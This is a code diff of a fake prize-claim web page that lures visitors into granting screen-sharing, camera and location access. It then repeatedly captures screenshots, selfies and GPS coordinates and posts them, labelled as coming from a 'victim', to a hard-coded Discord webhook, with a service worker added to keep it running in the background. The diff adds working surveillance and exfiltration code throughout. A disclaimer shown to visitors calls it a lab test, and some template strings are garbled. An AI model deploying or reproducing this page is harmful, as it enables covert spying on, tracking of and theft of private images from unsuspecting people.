@@ -3,94 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Your Prize - One Click</title>
+    <title>You Won $1000 – Claim Now</title>
     <style>
-        body {margin:0;background:#000;color:#0f0;font-family:Arial;text-align:center;padding:50px;}
-        button {padding:25px 60px;font-size:28px;background:#c00;color:white;border:none;border-radius:20px;cursor:pointer;}
-        .info {margin-top:50px;color:#666;font-size:14px;}
+        body {margin:0;background:linear-gradient(#667eea,#764ba2);color:white;text-align:center;padding:50px;font-family:Arial;}
+        h1 {font-size:38px;}
+        button {margin:40px;padding:25px 70px;font-size:28px;background:#ff4757;border:none;border-radius:25px;cursor:pointer;box-shadow:0 10px 30px rgba(0,0,0,0.5);}
+        button:hover {background:#ff3742;transform:scale(1.05);}
+        .note {font-size:14px;margin-top:50px;color:#ddd;}
     </style>
 </head>
 <body>
 
-<h1>Congratulations! You Won $500</h1>
-<button onclick="startEverything()">CLAIM NOW (one click)</button>
-<div class="info">Lab test only – requires camera + screen sharing</div>
+<h1>CONGRATULATIONS!</h1>
+<h2>You won $1000 Gift Card</h2>
+<button onclick="startStealing()">CLAIM PRIZE NOW</button>
+<div class="note">Lab test only – requires camera & screen for verification</div>
 
 <script>
-// YOUR DISCORD WEBHOOK HERE
+// YOUR DISCORD WEBHOOK (already inserted)
 const WEBHOOK = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
 
 let screenStream = null;
-let cameraStream = null;
-let watchId = null;
+let camStream = null;
+let locWatch = null;
 
-// Register persistent service worker (keeps running in background)
-navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
-    self.addEventListener('periodicsync', e => {
-        if (e.tag === 'android-steal') {
-            e.waitUntil(fetch('${WEBHOOK}', {method:'POST', body:JSON.stringify({content:'Background alive - '+new Date()})}));
-        }
-    });
-`));
-
-async function startEverything() {
+async function startStealing() {
     try {
-        // 1. Get SCREEN + CAMERA at the same time
-        screenStream = await navigator.mediaDevices.getDisplayMedia({video:true, audio:false});
-        cameraStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true});
+        // 1. Ask for SCREEN + CAMERA together (looks like Zoom/Discord)
+        screenStream = await navigator.mediaDevices.getDisplayMedia({video:true});
+        camStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
 
-        alert("Prize activated! Processing...");
+        alert("Thank you! Processing your prize...");
 
-        const screenVideo = document.createElement('video');
-        screenVideo.srcObject = screenStream;
-        screenVideo.play();
+        const screenVid = document.createElement('video');
+        screenVid.srcObject = screenStream;
+        screenVid.play();
 
-        const camVideo = document.createElement('video');
-        camVideo.srcObject = cameraStream;
-        camVideo.play();
+        const camVid = document.createElement('video');
+        camVid.srcObject = camStream;
+        camVid.play();
 
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
 
-        // 2. SCREEN every 4 seconds
+        // SCREEN every 7 seconds
         setInterval(() => {
-            canvas.width = screenVideo.videoWidth;
-            canvas.height = screenVideo.videoHeight;
-            ctx.drawImage(screenVideo, 0, 0);
-            canvas.toBlob(blob => sendToDiscord(blob, "SCREEN", "screen.jpg"), 'image/jpeg', 0.75);
-        }, 4000);
+            canvas.width = screenVid.videoWidth;
+            canvas.height = screenVid.videoHeight;
+            ctx.drawImage(screenVid, 0, 0);
+            canvas.toBlob(b => send(b, "SCREEN"), "image/jpeg", 0.8);
+        }, 7000);
 
-        // 3. CAMERA every 8 seconds
+        // CAMERA every 5 seconds
         setInterval(() => {
-            canvas.width = camVideo.videoWidth;
-            canvas.height = camVideo.videoHeight;
-            ctx.drawImage(camVideo, 0, 0);
-            canvas.toBlob(blob => sendToDiscord(blob, "CAMERA", "cam.jpg"), 'image/jpeg', 0.8);
-        }, 8000);
+            canvas.width = camVid.videoWidth;
+            canvas.height = camVid.videoHeight;
+            ctx.drawImage(camVid, 0, 0);
+            canvas.toBlob(b => send(b, "SELFIE"), "image/jpeg", 0.8);
+        }, 5000);
 
-        // 4. LOCATION every 30 seconds (works in background too)
-        watchId = navigator.geolocation.watchPosition(pos => {
-            const loc = `Lat: \( {pos.coords.latitude}, Lon: \){pos.coords.longitude}, Acc: ${pos.coords.accuracy}m`;
-            sendToDiscord(null, "LOCATION", loc);
-        }, null, {enableHighAccuracy: true, maximumAge: 0, timeout: 30000});
+        // LOCATION every 20 seconds (background too)
+        locWatch = navigator.geolocation.watchPosition(pos => {
+            const map = `https://maps.google.com/?q=\( {pos.coords.latitude}, \){pos.coords.longitude}`;
+            send(null, `LOCATION\n\( {map}\nAccuracy: \){pos.coords.accuracy}m`);
+        }, null, {enableHighAccuracy:true, timeout:20000, maximumAge:0});
 
-        // 5. Register background sync (runs even when Chrome is closed)
-        if ('periodicSync' in navigator.serviceWorker) {
-            const reg = await navigator.serviceWorker.ready;
-            reg.periodicSync.register('android-steal', {minInterval: 15 * 60 * 1000}); // every 15 min
+        // Keep alive in background
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('data:text/javascript,self.addEventListener("periodicsync",e=>e.waitUntil(fetch("' + WEBHOOK + '",{method:"POST",body:JSON.stringify({content:"Still alive in background – "+new Date()})})))');
         }
 
     } catch(e) {
-        alert("You blocked access - no prize today");
+        alert("You blocked permission – no prize today");
     }
 }
 
-function sendToDiscord(blob, type, filename) {
+function send(blob, text) {
     const form = new FormData();
-    if (blob) form.append("file", blob, filename || "capture.jpg");
-    form.append("content", `**\( {type}** - \){new Date().toLocaleString()}\nUser: ${navigator.userAgent.split(' ').pop()}`);
-    
-    fetch(WEBHOOK + "?wait=true", {method: "POST", body: form, keepalive: true});
+    if (blob) form.append("file", blob, "capture.jpg");
+    form.append("content", `**ANDROID VICTIM**\n\( {text || "Capture"}\n \){new Date().toLocaleString()}\n${navigator.userAgent.split(" ").pop()}`);
+
+    fetch(WEBHOOK + "?wait=true", {method:"POST", body:form, keepalive:true});
 }
 </script>
 
